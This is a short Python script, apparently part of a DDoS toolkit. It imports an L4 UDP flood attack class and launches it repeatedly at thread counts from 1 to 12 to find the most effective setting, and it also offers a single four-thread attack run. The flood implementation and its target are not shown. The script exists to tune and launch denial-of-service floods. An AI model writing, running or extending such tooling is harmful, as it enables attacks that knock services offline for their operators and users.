import time
from ddos.attacks.l4_attack import L4UDPAttack
from utils.analyses.l4udp_analyses import search_best_thrds_num


# Test n attack series for search best params
def attack_series(n: int = 10):
    l4udp_attack = L4UDPAttack()
    threads = [1, 2, 4, 6, 8, 10, 12]
    for thread_num in threads:
        for i in range(n):
            l4udp_attack.attack(num_threads=thread_num)
            time.sleep(10)
    search_best_thrds_num()

# Test single attack
def attack():
    l4udp_attack = L4UDPAttack()
    l4udp_attack.attack(num_threads=4)